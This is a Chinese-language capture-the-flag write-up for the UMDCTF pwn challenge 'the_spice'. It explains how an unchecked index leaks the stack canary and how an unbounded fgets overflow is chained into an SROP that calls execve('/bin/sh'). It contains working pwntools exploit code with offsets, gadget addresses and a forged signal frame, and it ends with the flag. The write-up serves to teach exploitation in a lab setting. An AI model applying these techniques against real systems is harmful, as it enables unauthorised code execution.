# the_spice

## 题目简述

程序在栈上保存 8 个 `spice_buyer`，启用了栈 Canary、NX 和 Full RELRO，但没有 PIE。添加买家时，用户可自行指定写入 `name[20]` 的长度；查看买家时又没有检查下标。需要先用越界读取恢复栈地址和 Canary，再借程序现成的 `syscall` 指令构造 SROP，执行 `execve("/bin/sh", 0, 0)`。

## 解题过程

菜单 4 直接打印 `buyers`：

```c
printf("... here's what it saw: %p\n", buyers);
```

这给出了栈上数组基址。后续 payload 从 `buyers[0].name` 开始，而 `name` 位于结构体偏移 4，所以 `/bin/sh` 的运行时地址是 `buyers + 4`。

菜单 3 与其他分支不同，没有验证 `num`：

```c
printf(
    "Buyer %d: %s, allocated %u tons of spice\n",
    num,
    buyers[num].name,
    spice_amount(buyers[num])
);
```

读取索引 9 时，伪结构体恰好覆盖到栈 Canary。`spice_amount` 打印出的无符号整数提供低 4 字节，`%s` 输出的 name 开头提供高 4 字节，拼接即可恢复完整值：

```python
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"index: ", b"9")
io.recvuntil(b"Buyer 9: ")
high = io.recvuntil(b", allocated ", drop=True)[:4]
low = int(io.recvuntil(b" tons", drop=True))
canary = u64(p32(low) + high)
```

添加买家时，`len` 未限制便传给 `fgets(buyers[num].name, len, stdin)`。从 `buyers[0].name` 到 Canary 的偏移为 `0xd4`，因此可以覆盖整个数组、原样写回 Canary，并控制保存的 RBP 与 RIP。

题目没有 `pop rax`，但 `spice_amount()` 按值接收 24 字节结构体，编译器从调用者栈上读取其第一个字段并返回到 EAX。把返回地址设为 `spice_amount`，并在它期望的栈参数位置放置 `0x0f`，即可令 RAX 变成 `rt_sigreturn` 的系统调用号 15。之后执行 `0x401274` 处的 `syscall`，内核便从栈上恢复伪造信号帧。

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack + 4
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0
frame.rip = 0x401274

payload = b"/bin/sh\x00".ljust(0xd4, b"A")
payload += p64(canary)
payload += p64(0)
payload += p64(elf.sym["spice_amount"])
payload += p64(0x4011cd)  # pop rbp; ret
payload += p64(0x0f)      # 同时充当结构体首字段，使 EAX = 15
payload += p64(0x401274)  # syscall
payload += bytes(frame)
```

把 payload 写入索引 0 后选择出售香料，使 `main` 走到返回路径。Canary 校验通过，ROP 触发 sigreturn，随后执行 `execve`。读取 flag：

```text
UMDCTF{use_the_spice_to_see_into_the_srop_future}
```

## 方法总结

本题的两个信息泄露分别解决 ASLR 下的栈地址和 Canary，任意长度 `fgets` 则提供控制流覆盖。没有常规 `pop rax` 时，可利用按值传递大型结构体的栈参数布局，让 `spice_amount` 把栈上的 `0x0f` 返回到 RAX，再衔接现成 `syscall` 完成 SROP。
